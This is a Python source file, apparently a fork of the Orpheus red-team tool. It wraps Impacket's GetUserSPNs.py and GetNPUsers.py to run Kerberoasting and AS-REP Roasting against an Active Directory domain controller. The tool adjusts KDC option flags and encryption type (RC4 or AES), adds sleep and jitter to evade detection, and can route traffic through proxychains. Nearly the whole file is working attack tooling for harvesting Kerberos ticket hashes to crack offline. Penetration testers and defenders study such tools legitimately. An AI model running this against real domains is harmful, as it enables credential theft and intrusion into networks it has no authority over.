#!/usr/bin/env python3
# Derived from TrustedSec/Orpheus, by Ben Ten (@ben0xa).
# Upstream GNU GPLv3: see LICENSE.

import os
import sys
import shlex
import argparse
import subprocess
from dataclasses import dataclass
from impacket.krb5 import constants
from signal import signal, SIGINT
from orpheus_runtime import normalize_kdc_options

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
IS_WINDOWS = os.name == 'nt'

kdcopt = "0x40810000"
cred = "domain.local/username:password"
dcip = "10.1.1.1"
file = "spns.txt"
enctype = 18
kdcbin = f'{int(kdcopt, 16):032b}'
cmd = ''
cmd_argv = []
sleep = 0
jitter = 0
proxychains = False
pcconf = ''
mode = 'kerb'
usersfile = ''
overwrite = False


@dataclass
class OrpheusConfig:
    cred: str
    dcip: str
    output_file: str = 'spns.txt'
    options_hex: str = '0x40810000'
    options_bits: str = '01000000100000010000000000000000'
    encryption: int = 18
    sleep: int = 0
    jitter: int = 0
    mode: str = 'kerb'
    users_file: str = ''
    overwrite: bool = False
    proxychains: bool = False
    proxychains_config: str = ''


def parse_kdc_options(value: str) -> tuple[str, str]:
    normalized, indexes = normalize_kdc_options(value)
    bits = ['0'] * 32
    for index in indexes:
        bits[index] = '1'
    return normalized, ''.join(bits)


def parse_nonnegative_int(value: str, field: str) -> int:
    try:
        number = int(value)
    except (TypeError, ValueError) as exc:
        raise ValueError(f'{field} must be a nonnegative integer') from exc
    if number < 0:
        raise ValueError(f'{field} must be a nonnegative integer')
    return number

class termcolor:
    WHITE = '\033[37m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    RED = '\033[31m'
    END = '\033[0m'
    BOLD = '\033[1m'
    LIGHTBLUE = '\033[94m'
    LIGHTRED = '\033[91m'

def clear_screen():
    os.system('cls' if IS_WINDOWS else 'clear')

def signal_handler(sig, frame):
    print('')
    print('Type exit to exit. Press enter to continue...')

def banner():
    print(termcolor.BLUE + termcolor.BOLD + '        |\\  ' + termcolor.END)
    print(termcolor.BLUE + termcolor.BOLD + '___|\\___|\\\\___██████__██████__██████__██___██_███████_██____██_███████______' + termcolor.END)
    print(termcolor.BLUE + termcolor.BOLD + '___|/__@\'_\\|_██____██_██___██_██___██_██___██_██______██____██_██________|__||' + termcolor.END)
    print(termcolor.BLUE + termcolor.BOLD + '__/|_______|_██____██_██████__██████__███████_█████___██____██_███████___|__||' + termcolor.END)
    print(termcolor.BLUE + termcolor.BOLD + '_(_/_\\____@\'_██____██_██___██_██______██___██_██______██____██______██__@\'__||' + termcolor.END)
    print(termcolor.BLUE + termcolor.BOLD + '__\\|/_________██████__██___██_██______██___██_███████__██████__███████______||' + termcolor.END)

    print(termcolor.LIGHTBLUE + '                   Author: ' + termcolor.WHITE + termcolor.BOLD + 'Ben Ten (@ben0xa)' + termcolor.END + termcolor.WHITE + ' - ' + termcolor.LIGHTBLUE + 'Version: ' + termcolor.WHITE + termcolor.BOLD + '0.2' + termcolor.END)
    print('')
    print(termcolor.GREEN + termcolor.BOLD + '[+]' + termcolor.END + ' KDC Options:')

    optlines = list()
    optidx = -1
    for option in constants.KDCOptions:
        optname = option.name.replace('_', ' ').title()
        v = kdcbin[option.value:option.value + 1]
        if v == '1':
            onoff = '[ON] '
            oncolor = termcolor.GREEN
        else:
            onoff = '[OFF]'
            oncolor = termcolor.RED
        line = '    (' + '{:2}'.format(option.value) + ') ' + '{:25s}'.format(optname) + oncolor + termcolor.BOLD + onoff + termcolor.END
        optidx += 1
        if optidx >= 11:
            optlines[optidx - 11] = optlines[optidx - 11] + line
        else:
            optlines.append(line)

    for optline in optlines:
        print(optline)

    print('')

    print(termcolor.GREEN + termcolor.BOLD + '[+]' + termcolor.END + '{:31s}'.format(' Ticket Options Value:') + termcolor.WHITE + termcolor.BOLD + '[' + kdcopt + ']' + termcolor.END)
    print('')
    label = ' GetNPUsers.py Parameters:' if mode == 'asrep' else ' GetUserSPNs.py Parameters:'
    print(termcolor.GREEN + termcolor.BOLD + '[+]' + termcolor.END + '{:31s}'.format(label) + termcolor.END)
    print('    ' + '{:30s}'.format('(cred) Credentials') + termcolor.YELLOW + termcolor.BOLD + '[' + cred + ']' + termcolor.END)
    print('    ' + '{:30s}'.format('(dcip) Domain IP Address') + termcolor.YELLOW + termcolor.BOLD + '[' + dcip + ']' + termcolor.END)
    print('    ' + '{:30s}'.format('(file) Filename') + termcolor.YELLOW + termcolor.BOLD + '[' + file + ']' + termcolor.END)
    print('    ' + '{:30s}'.format('(enc) Encryption') + termcolor.YELLOW + termcolor.BOLD + '[' + str(enctype) + ']' + termcolor.END)
    print('    ' + '{:30s}'.format('(sleep) Sleep') + termcolor.YELLOW + termcolor.BOLD + '[' + str(sleep) + ']' + termcolor.END)
    print('    ' + '{:30s}'.format('(jitter) Jitter') + termcolor.YELLOW + termcolor.BOLD + '[' + str(jitter) + ']' + termcolor.END)
    print('    ' + '{:30s}'.format('(overwrite) Replace output') + ('[ON]' if overwrite else '[OFF]'))
    if proxychains:
        pc_state = termcolor.GREEN + termcolor.BOLD + '[ON]' + termcolor.END
    else:
        pc_state = termcolor.RED + termcolor.BOLD + '[OFF]' + termcolor.END
    pc_suffix = ' (Linux only)' if IS_WINDOWS else ''
    print('    ' + '{:30s}'.format('(proxychains) Proxychains') + pc_state + termcolor.YELLOW + pc_suffix + termcolor.END)
    pc_conf_display = pcconf if pcconf else '[not set]'
    print('    ' + '{:30s}'.format('(pcconf) Proxychains Config') + termcolor.YELLOW + termcolor.BOLD + '[' + pc_conf_display + ']' + termcolor.END)
    print('    ' + '{:30s}'.format('(mode) Attack Mode') + termcolor.YELLOW + termcolor.BOLD + '[' + mode + ']' + termcolor.END)
    if mode == 'asrep':
        uf_display = usersfile if usersfile else '[not set]'
        print('    ' + '{:30s}'.format('(usersfile) Users File') + termcolor.YELLOW + termcolor.BOLD + '[' + uf_display + ']' + termcolor.END)
    print('')

def pycommand():
    print('')
    print(termcolor.WHITE + termcolor.BOLD + cmd + termcolor.END)
    print('')

def warn(msg):
    print(termcolor.RED + termcolor.BOLD + '[!]' + termcolor.END + ' ' + msg)

def validate_pcconf():
    if proxychains and pcconf and not os.path.isfile(pcconf):
        warn('proxychains config not found or not readable: ' + pcconf)
        return False
    return True

def validate_usersfile(path):
    if path and not os.path.isfile(path):
        warn('usersfile not found or not readable: ' + path)
        return False
    return True

def child_script(selected_mode=None):
    name = 'GetNPUsers.py' if (selected_mode or mode) == 'asrep' else 'GetUserSPNs.py'
    return os.path.join(SCRIPT_DIR, name)

def build_argv(config=None):
    """Build child arguments as separate tokens for execution with shell=False."""
    if config is None:
        config = OrpheusConfig(
            cred=cred, dcip=dcip, output_file=file, options_hex=kdcopt,
            options_bits=kdcbin, encryption=enctype, sleep=sleep, jitter=jitter,
            mode=mode, users_file=usersfile, overwrite=overwrite,
            proxychains=proxychains, proxychains_config=pcconf,
        )
    argv = []
    if config.proxychains and not IS_WINDOWS:
        argv.append('proxychains')
        if config.proxychains_config:
            argv += ['-f', config.proxychains_config]

    argv += [sys.executable, child_script(config.mode), config.cred,
             '-dc-ip', config.dcip,
             '-request',
             '-outputfile', config.output_file,
             '-options', config.options_hex,
             '-encryption', str(config.encryption),
             '-sleep', str(config.sleep),
             '-jitter', str(config.jitter)]

    if config.mode == 'asrep' and config.users_file:
        argv += ['-no-pass', '-usersfile', config.users_file]
    if config.overwrite:
        argv.append('-overwrite')

    return argv

def updatecmd():
    global cmd, cmd_argv
    if proxychains and IS_WINDOWS:
        warn('proxychains is Linux-only and will be ignored on Windows.')
    cmd_argv = build_argv()
    cmd = ' '.join(shlex.quote(a) for a in cmd_argv)

def commands():
    print('')
    print('Commands:')
    print('    ' + '{:30s}'.format('0 to 31') + termcolor.WHITE + 'Toggles the specific KDC Option flag.' + termcolor.END)
    print('    ' + '{:30s}'.format('hex <value>') + termcolor.WHITE + 'Sets KDC Options from a hexadecimal value.' + termcolor.END)
    print('    ' + '{:30s}'.format('cred <value>') + termcolor.WHITE + 'Sets the Impacket credential parameter (domain/user[:password]).' + termcolor.END)
    print('    ' + '{:30s}'.format('dcip <value>') + termcolor.WHITE + 'Sets the Domain Controller IP parameter.' + termcolor.END)
    print('    ' + '{:30s}'.format('file <value>') + termcolor.WHITE + 'Sets the output filename.' + termcolor.END)
    print('    ' + '{:30s}'.format('enc') + termcolor.WHITE + 'Toggles the encryption type between 18 (AES-256) and 23 (RC4).' + termcolor.END)
    print('    ' + '{:30s}'.format('sleep <value>') + termcolor.WHITE + 'Set seconds to wait between consecutive requests (default 0).' + termcolor.END)
    print('    ' + '{:30s}'.format('jitter <value>') + termcolor.WHITE + 'Set the Jitter applied to the sleep (optional, default 0).' + termcolor.END)
    print('    ' + '{:30s}'.format('overwrite') + termcolor.WHITE + 'Toggles replacement of an existing output file.' + termcolor.END)
    print('    ' + '{:30s}'.format('proxychains') + termcolor.WHITE + 'Toggles the proxychains prefix on/off (Linux only).' + termcolor.END)
    print('    ' + '{:30s}'.format('pcconf <value>') + termcolor.WHITE + 'Sets the proxychains config file path (used with -f).' + termcolor.END)
    print('    ' + '{:30s}'.format('mode') + termcolor.WHITE + 'Toggles attack mode: kerb (Kerberoasting) <-> asrep (AS-REP Roasting).' + termcolor.END)
    print('    ' + '{:30s}'.format('usersfile <value>') + termcolor.WHITE + 'Sets users list file for AS-REP Roasting (asrep mode). Enables -no-pass.' + termcolor.END)
    print('    ' + '{:30s}'.format('command') + termcolor.WHITE + 'Show the built command.' + termcolor.END)
    print('    ' + '{:30s}'.format('run') + termcolor.WHITE + 'Executes the built command.' + termcolor.END)
    print('    ' + '{:30s}'.format('clear') + termcolor.WHITE + 'Clears the screen and displays the options.' + termcolor.END)
    print('    ' + '{:30s}'.format('help') + termcolor.WHITE + 'Shows this list.' + termcolor.END)
    print('    ' + '{:30s}'.format('exit') + termcolor.WHITE + 'Exits the script.' + termcolor.END)
    print('    ' + '{:30s}'.format('(CLI mode)') + termcolor.WHITE + 'Run `orpheus --help` to see non-interactive CLI usage.' + termcolor.END)
    print('')

def apply_cred(value):
    global cred
    cred = value
    clear_screen(); banner()

def apply_dcip(value):
    global dcip
    dcip = value
    clear_screen(); banner()

def apply_file(value):
    global file
    file = value
    clear_screen(); banner()

def apply_usersfile(value):
    global usersfile
    if value and not validate_usersfile(value):
        return
    usersfile = value
    clear_screen(); banner()

def apply_pcconf(value):
    global pcconf
    pcconf = value
    if value:
        validate_pcconf()
    clear_screen(); banner()

def apply_hex(value):
    global kdcbin, kdcopt
    try:
        normalized, bits = parse_kdc_options(value)
        kdcopt, kdcbin = normalized, bits
        clear_screen(); banner()
    except ValueError as exc:
        print(str(exc))

def apply_sleep(value):
    global sleep
    try:
        sleep = parse_nonnegative_int(value, 'sleep')
    except ValueError as exc:
        print(str(exc))
    clear_screen(); banner()

def apply_jitter(value):
    global jitter
    try:
        jitter = parse_nonnegative_int(value, 'jitter')
    except ValueError as exc:
        print(str(exc))
    clear_screen(); banner()


def toggle_overwrite():
    global overwrite
    overwrite = not overwrite
    clear_screen(); banner()

def toggle_enc():
    global enctype
    enctype = 23 if enctype == 18 else 18
    clear_screen(); banner()

def toggle_mode():
    global mode
    mode = 'asrep' if mode == 'kerb' else 'kerb'
    clear_screen(); banner()

def toggle_proxychains():
    global proxychains
    if IS_WINDOWS:
        warn('proxychains is Linux-only and cannot be enabled on Windows.')
        return
    proxychains = not proxychains
    clear_screen(); banner()

def toggle_kdc_bit(irsp):
    global kdcbin, kdcopt
    if 0 <= irsp <= 31:
        val = kdcbin[irsp:irsp+1]
        val = '1' if val == '0' else '0'
        kdcbin = kdcbin[:irsp] + val + kdcbin[irsp+1:]
        kdcopt = hex(int(kdcbin, 2))
    clear_screen(); banner()

def dispatch(rsp):
    """Match the first input token as a command, preserving its argument."""
    parts = rsp.strip().split(maxsplit=1)
    if not parts:
        return
    verb = parts[0]
    arg = parts[1] if len(parts) > 1 else ''

    if verb.isdigit():
        toggle_kdc_bit(int(verb))
    elif verb == 'hex':
        apply_hex(arg)
    elif verb == 'cred':
        apply_cred(arg)
    elif verb == 'dcip':
        apply_dcip(arg)
    elif verb == 'file':
        apply_file(arg)
    elif verb == 'usersfile':
        apply_usersfile(arg)
    elif verb == 'pcconf':
        apply_pcconf(arg)
    elif verb == 'enc':
        toggle_enc()
    elif verb == 'sleep':
        apply_sleep(arg)
    elif verb == 'jitter':
        apply_jitter(arg)
    elif verb == 'overwrite':
        toggle_overwrite()
    elif verb == 'proxychains':
        toggle_proxychains()
    elif verb == 'mode':
        toggle_mode()
    elif verb == 'help':
        commands()
    elif verb == 'command':
        pycommand()
    elif verb == 'clear':
        clear_screen(); banner()
    elif verb == 'run':
        if validate_pcconf():
            subprocess.call(cmd_argv)
    elif verb == 'exit':
        return
    else:
        print('Invalid command. Type help.')

def main():
    clear_screen()
    banner()
    updatecmd()
    while True:
        try:
            rsp = input(termcolor.LIGHTBLUE + 'orpheus ' + termcolor.LIGHTRED + '(command)' + termcolor.LIGHTBLUE + ' > ' + termcolor.END)
        except EOFError:
            return
        if rsp.strip() == 'exit':
            return
        dispatch(rsp)
        updatecmd()

def build_parser():
    parser = argparse.ArgumentParser(
        prog='orpheus',
        description=(
            'orpheus wrapper for GetUserSPNs.py / GetNPUsers.py. '
            'Run without arguments to enter the interactive REPL. '
            'Pass arguments to run in one-shot CLI mode. '
            'Note: the REPL verb `command` (prints the built command) has no CLI '
            'equivalent at runtime - use `--dry-run` to print the command instead of executing it.'
        ),
        epilog=(
            "Examples:\n"
            "  Kerberoasting (default mode):\n"
            "    orpheus --cred 'lab.local/user:pass' --dcip 10.1.1.1\n\n"
            "  AS-REP Roasting with a users list:\n"
            "    orpheus --cred 'lab.local/' --dcip 10.1.1.1 --mode asrep --usersfile users.txt\n\n"
            "  With proxychains (Linux only):\n"
            "    orpheus --cred 'lab.local/user:pass' --dcip 10.1.1.1 "
            "--proxychains --pcconf proxychains-1080.conf --sleep 5 --jitter 3"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument('--cred', required=True, help='Impacket credential (domain/user[:password]).')
    parser.add_argument('--dcip', required=True, help='Domain Controller IP address.')
    parser.add_argument('--file', default='spns.txt', help='Output filename (default: spns.txt).')
    parser.add_argument('--options', default='0x40810000', help='KDC options as decimal or 0x-prefixed integer (default: 0x40810000).')
    parser.add_argument('--enc', type=int, choices=[18, 23], default=18, help='Encryption type: 18 (AES-256) or 23 (RC4). Default: 18.')
    parser.add_argument('--sleep', type=int, default=0, help='Seconds to wait between consecutive requests (default: 0, optional).')
    parser.add_argument('--jitter', type=int, default=0, help='Jitter (+/- seconds) applied to sleep (default: 0, optional).')
    parser.add_argument('--overwrite', action='store_true', help='Replace an existing output file.')
    parser.add_argument('--proxychains', action='store_true', help='Prefix the command with proxychains (Linux only; ignored on Windows).')
    parser.add_argument('--pcconf', default='', help='Path to proxychains config file (passed as -f).')
    parser.add_argument('--mode', choices=['kerb', 'asrep'], default='kerb', help='Attack mode: kerb=Kerberoasting (GetUserSPNs.py), asrep=AS-REP Roasting (GetNPUsers.py). Default: kerb.')
    parser.add_argument('--usersfile', default='', help='Users list file, used only with --mode asrep. When set, --cred should be in `domain/` form (no user:pass); -no-pass is added automatically.')
    parser.add_argument('-n', '--dry-run', action='store_true', help='Print the built command and exit without executing.')
    return parser

def run_cli(argv=None):
    args = build_parser().parse_args(argv)
    try:
        normalized, bits = parse_kdc_options(args.options)
        parsed_sleep = parse_nonnegative_int(args.sleep, 'sleep')
        parsed_jitter = parse_nonnegative_int(args.jitter, 'jitter')
    except ValueError as exc:
        warn(str(exc))
        return 2
    config = OrpheusConfig(
        cred=args.cred, dcip=args.dcip, output_file=args.file,
        options_hex=normalized, options_bits=bits, encryption=args.enc,
        sleep=parsed_sleep, jitter=parsed_jitter, mode=args.mode,
        users_file=args.usersfile, overwrite=args.overwrite,
        proxychains=args.proxychains, proxychains_config=args.pcconf,
    )
    if config.proxychains and IS_WINDOWS:
        warn('proxychains is Linux-only and will be ignored on Windows.')
        config.proxychains = False
    if config.users_file and not os.path.isfile(config.users_file):
        warn('usersfile not found or not readable: ' + config.users_file)
        return 2
    if config.proxychains and config.proxychains_config and not os.path.isfile(config.proxychains_config):
        warn('proxychains config not found or not readable: ' + config.proxychains_config)
        return 2
    child_argv = build_argv(config)
    if args.dry_run:
        print(' '.join(shlex.quote(a) for a in child_argv))
        return 0
    return subprocess.run(child_argv, shell=False).returncode

def cli():
    if len(sys.argv) > 1:
        return run_cli()
    signal(SIGINT, signal_handler)
    main()
    return 0


if __name__ == '__main__':
    sys.exit(cli())
